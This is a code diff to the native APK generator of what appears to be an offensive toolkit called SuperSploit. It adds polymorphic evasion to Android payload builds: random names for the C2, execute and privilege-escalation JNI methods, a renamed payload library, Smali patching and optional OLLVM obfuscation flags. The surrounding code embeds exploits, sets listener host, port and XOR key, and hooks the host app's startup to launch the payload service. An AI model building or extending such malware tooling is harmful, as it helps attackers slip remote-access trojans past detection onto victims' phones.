@@ -64,6 +64,20 @@ class NativeApkGenerator:
             self.stub_template_dir = os.path.join(self.install_root, "templates", "payload", "native_gen", "stub_template")
         self.apktool_jar = os.path.join(self.install_root, ".data", "apktool.jar")
 
+        # --- POLYMORPHIC RANDOMIZATION ---
+        self.rand_id = self._generate_random_string(6)
+        self.lib_raw_name = "core" + self._generate_random_string(8)
+        self.lib_name = "lib" + self.lib_raw_name
+        self.jni_start_method = "v1init" + self._generate_random_string(6)
+        self.jni_execute_method = "v1exec" + self._generate_random_string(6)
+        self.jni_start_native_c2_method = "v1c2" + self._generate_random_string(6)
+        self.jni_start_lpe_method = "v1lpe" + self._generate_random_string(6)
+
+    def _generate_random_string(self, length=8):
+        import random
+        import string
+        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
+
     def generate(self):
         if self.exploit_path:
             print(f"[*] Starting Native C Exploit Embedding (Exploit={os.path.basename(self.exploit_path)})...")
@@ -138,6 +152,15 @@ class NativeApkGenerator:
         c_code = c_code.replace("{{LPORT}}", self.lport)
         c_code = c_code.replace("{{XOR_KEY}}", self.xor_key)
 
+        # Apply Polymorphic JNI renaming
+        print(f"[*] Applying JNI polymorphism: startNativeC2 -> {self.jni_start_native_c2_method}")
+        c_code = c_code.replace("startNativeC2", self.jni_start_native_c2_method)
+        c_code = c_code.replace("executeNative", self.jni_execute_method)
+        c_code = c_code.replace("startLPE", self.jni_start_lpe_method)
+        
+        # Surgical replacement for Java_..._start to avoid mangling standard C functions or headers
+        c_code = c_code.replace("PayloadService_start(", f"PayloadService_{self.jni_start_method}(")
+
         self.patched_c_path = os.path.join(self.build_dir, "patched_payload.c")
         with open(self.patched_c_path, 'w') as f:
             f.write(c_code)
@@ -157,18 +180,30 @@ class NativeApkGenerator:
              return False
             
         os.makedirs(lib_dir, exist_ok=True)
-        so_path = os.path.join(lib_dir, "libpayload.so")
+        so_path = os.path.join(lib_dir, f"{self.lib_name}.so")
         
+        db_data = DatabaseManagment.get()
+        ollvm_enabled = str(db_data.get("OLLVM_ENABLED", "false")).lower() == "true"
+
+        abi = os.path.basename(lib_dir)
+
         compile_cmd = [
             ndk_compiler,
             "-shared",
             "-fPIC",
+            f"-I{os.path.join(self.install_root, '.data', '.assets', 'openssl', 'include')}",
             self.patched_c_path,
+            os.path.join(self.install_root, '.data', '.assets', 'openssl', abi, 'libcrypto.a'),
             "-o",
             so_path,
             "-O2",
             "-llog"
         ]
+
+        if ollvm_enabled:
+            print("[*] OLLVM_ENABLED=true: Applying control flow flattening and instruction substitution...")
+            # These are standard OLLVM flags
+            compile_cmd.extend(["-mllvm", "-bcf", "-mllvm", "-sub", "-mllvm", "-fla"])
         
         proc = subprocess.run(compile_cmd, capture_output=True, text=True)
         if proc.returncode != 0:
@@ -386,6 +421,13 @@ class NativeApkGenerator:
         with open(manifest_path, 'w') as f:
             f.write(manifest_content)
 
+        # Apply Polymorphic Patching to Smali (Pro Feature)
+        from .license_manager import LicenseManager
+        if LicenseManager.check_pro_status():
+            self._polymorphic_patch_smali()
+        else:
+            print("[*] Skipping Polymorphic Rotation (SuperSploit Pro feature).")
+
         # 1.5 Set targetSdkVersion in apktool.yml to 25
         apktool_yml_path = os.path.join(self.build_dir, "apktool.yml")
         if os.path.exists(apktool_yml_path):
@@ -459,6 +501,41 @@ class NativeApkGenerator:
             shutil.rmtree(smali_target)
         
         shutil.copytree(smali_src, smali_target)
+
+    def _polymorphic_patch_smali(self):
+        """Randomizes JNI method names and library name in Smali files."""
+        print("[*] Performing polymorphic patching on Smali files...")
+        import glob
+        smali_files = glob.glob(os.path.join(self.build_dir, "smali*", "**", "*.smali"), recursive=True)
+        
+        for smali_file in smali_files:
+            with open(smali_file, 'r') as f:
+                content = f.read()
+            
+            original_content = content
+            
+            # Replace JNI method names
+            content = content.replace("executeNative", self.jni_execute_method)
+            content = content.replace("startNativeC2", self.jni_start_native_c2_method)
+            content = content.replace("startLPE", self.jni_start_lpe_method)
+            
+            # Handle 'start' method surgicaly - only native start(Landroid/content/Context;)V
+            # This prevents breaking Thread.start() or Context.startService()
+            content = content.replace("native start(Landroid/content/Context;)V", f"native {self.jni_start_method}(Landroid/content/Context;)V")
+            content = content.replace("->start(Landroid/content/Context;)V", f"->{self.jni_start_method}(Landroid/content/Context;)V")
+            
+            # Some older templates might use simple start()V as native
+            content = content.replace("native start()V", f"native {self.jni_start_method}()V")
+            # We ONLY replace ->start()V if it's on our known classes to be safe
+            content = content.replace(f"Lorg/supersploit/stub/PayloadService;->start()V", f"Lorg/supersploit/stub/PayloadService;->{self.jni_start_method}()V")
+
+            # Replace library name in System.loadLibrary
+            content = content.replace('const-string v0, "payload"', f'const-string v0, "{self.lib_raw_name}"')
+            content = content.replace('const-string v1, "payload"', f'const-string v1, "{self.lib_raw_name}"')
+
+            if content != original_content:
+                with open(smali_file, 'w') as f:
+                    f.write(content)
 
     def _hook_class(self, class_name, is_application=False):
         """Injects service start hook into onCreate of specified class."""
